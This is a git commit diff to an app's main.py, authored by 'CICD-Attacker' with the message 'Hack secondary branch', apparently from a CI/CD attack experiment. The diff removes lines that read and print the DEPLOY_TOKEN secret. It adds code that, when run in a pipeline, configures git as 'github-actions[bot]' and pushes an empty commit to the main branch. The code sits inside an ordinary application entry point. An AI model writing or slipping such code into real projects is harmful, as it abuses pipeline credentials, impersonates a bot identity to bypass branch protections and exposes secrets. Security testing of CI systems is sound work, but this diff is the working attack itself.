b12bc251428d19a45f83606378fa0b4c55a2cb89
CICD-Attacker <jacostuc2001@gmail.com>
2026-01-12 15:00:29 +0100

    Hack secondary branch

--- app/main.py
+++ app/main.py
@@ -1,20 +1,14 @@
 def main():
     print("App is running")
 
-    # print("Hacking 3")
-    # import os
-    # import subprocess
-    
-    # subprocess.run(["git", "config", "user.name", "github-actions[bot]"])
-    # subprocess.run(["git", "config", "user.email", "github-actions[bot]@users.noreply.github.com"])
-    # subprocess.run(["git", "commit", "--allow-empty", "-m", "CI commit"])
-    # subprocess.run(["git", "push", "origin", "HEAD:main"])
-    
-    print("Hacking secret")
+    print("Hacking")
     import os
-
-    token = os.getenv("DEPLOY_TOKEN")
-    print("DEPLOY_TOKEN: ", token)
+    import subprocess
+    
+    subprocess.run(["git", "config", "user.name", "github-actions[bot]"])
+    subprocess.run(["git", "config", "user.email", "github-actions[bot]@users.noreply.github.com"])
+    subprocess.run(["git", "commit", "--allow-empty", "-m", "CI commit"])
+    subprocess.run(["git", "push", "origin", "HEAD:main"])
 
 if __name__ == "__main__":
     main()
